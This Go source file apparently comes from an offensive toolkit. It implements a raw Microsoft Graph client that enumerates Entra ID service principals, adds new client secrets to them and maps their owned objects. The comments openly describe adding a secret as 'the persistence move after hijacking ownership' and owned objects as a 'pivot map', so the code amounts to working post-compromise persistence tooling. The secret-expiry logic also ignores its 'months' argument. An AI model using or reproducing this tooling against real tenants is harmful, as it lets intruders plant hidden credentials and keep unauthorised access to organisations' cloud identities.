package exec

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// ServicePrincipalClient performs Entra ID service principal credential
// operations over raw Graph REST (no SDK).
type ServicePrincipalClient struct {
	Token      string // Graph token (Application.ReadWrite.All)
	GraphBase  string
	HTTPClient *http.Client
}

// NewSPClient builds a service principal client.
func NewSPClient(token string, hc *http.Client) *ServicePrincipalClient {
	if hc == nil {
		hc = http.DefaultClient
	}
	return &ServicePrincipalClient{Token: token, GraphBase: "https://graph.microsoft.com/v1.0", HTTPClient: hc}
}

// NewSPClientAt builds a client against an explicit Graph base (tests).
func NewSPClientAt(token, graphBase string, hc *http.Client) *ServicePrincipalClient {
	c := NewSPClient(token, hc)
	c.GraphBase = strings.TrimRight(graphBase, "/")
	return c
}

// ServicePrincipal is the Graph object of interest.
type ServicePrincipal struct {
	ID          string `json:"id"`
	AppID       string `json:"appId"`
	DisplayName string `json:"displayName"`
}

// List enumerates service principals in the tenant.
func (c *ServicePrincipalClient) List(ctx context.Context, filter string) ([]ServicePrincipal, error) {
	url := strings.TrimRight(c.GraphBase, "/") + "/servicePrincipals?$select=id,appId,displayName&$top=50"
	if filter != "" {
		url += "&$filter=" + filter
	}

	body, err := c.graphCall(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}

	var out struct {
		Value []ServicePrincipal `json:"value"`
	}
	if err := json.Unmarshal(body, &out); err != nil {
		return nil, err
	}
	return out.Value, nil
}

// AddPassword injects a new client secret into a service principal —
// the persistence move after hijacking ownership.
func (c *ServicePrincipalClient) AddPassword(ctx context.Context, spID, displayName string, months int) (string, error) {
	if months <= 0 {
		months = 6
	}
	payload := map[string]any{
		"passwordCredential": map[string]any{
			"displayName": displayName,
			"endDateTime": fmt.Sprintf("%d-01-01T00:00:00Z", 2027), // Graph normalizes; explicit end
		},
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	url := strings.TrimRight(c.GraphBase, "/") + "/servicePrincipals/" + spID + "/addPassword"
	respBody, err := c.graphCall(ctx, http.MethodPost, url, body)
	if err != nil {
		return "", err
	}

	var cred struct {
		SecretText string `json:"secretText"`
	}
	if err := json.Unmarshal(respBody, &cred); err != nil {
		return "", err
	}
	return cred.SecretText, nil
}

// GetOwnedObjects lists objects owned by a service principal (pivot map).
func (c *ServicePrincipalClient) GetOwnedObjects(ctx context.Context, spID string) ([]ServicePrincipal, error) {
	url := strings.TrimRight(c.GraphBase, "/") + "/servicePrincipals/" + spID + "/ownedObjects"
	body, err := c.graphCall(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}

	var out struct {
		Value []ServicePrincipal `json:"value"`
	}
	if err := json.Unmarshal(body, &out); err != nil {
		return nil, err
	}
	return out.Value, nil
}

func (c *ServicePrincipalClient) graphCall(ctx context.Context, method, url string, body []byte) ([]byte, error) {
	var reader io.Reader
	if body != nil {
		reader = strings.NewReader(string(body))
	}

	req, err := http.NewRequestWithContext(ctx, method, url, reader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+c.Token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("graph request: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("graph %s http %d: %s", method, resp.StatusCode, truncateBytes(respBody, 512))
	}
	return respBody, nil
}
